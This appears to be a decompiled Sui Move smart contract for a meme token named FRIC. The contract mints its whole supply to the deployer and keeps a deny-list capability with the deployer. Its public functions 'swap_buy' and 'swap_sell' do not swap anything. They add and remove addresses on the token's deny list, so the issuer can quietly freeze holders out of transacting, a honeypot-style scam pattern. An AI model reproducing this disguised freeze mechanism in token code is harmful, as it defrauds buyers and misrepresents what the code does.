module 0xf83aa31238ba120886d0cb6731afa000afe8c9adc44eee44c00ad135b282a786::fric {
    struct FRIC has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FRIC, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FRIC>(arg0, 9, b"FRIC", b"FRIC", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZXTBS8KnU5g9W7yYYkFDuvLZqEr4Xh46e9Qa95BTzNqM"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FRIC>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FRIC>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FRIC>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FRIC>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FRIC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FRIC>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FRIC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FRIC>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

